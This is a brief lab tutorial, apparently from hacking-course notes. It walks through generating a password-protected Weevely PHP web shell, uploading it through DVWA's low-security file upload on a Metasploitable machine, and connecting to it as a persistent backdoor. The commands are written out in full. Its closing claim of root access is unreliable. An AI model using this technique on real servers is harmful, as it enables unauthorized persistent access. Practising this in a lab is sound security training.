It's important to preserve the access to the web server that we vulnerated. For this we use a web shell, having a backdoor

We will use the webshell **Weevely**

Generate the script with this:

````
weevely generate hacker /home/jilted/weevely.php
#hacker is the password
````

- Go to http://192.168.58.129/dvwa on mutillidate  with the ip of your metasploitable machine
- Log in with *admin password* credentials by default
- Click the DWA button
- Put the low difficult
- Select the upload tab
- Click on browse
- Copy the new url generated, like this:
http://192.168.58.129/dvwa/hackable/uploads/weevely.php

- Put the next command:
````
weevely http://192.168.58.129/dvwa/hackable/uploads/weevely.php hacker
````
- And now we are the root of the server
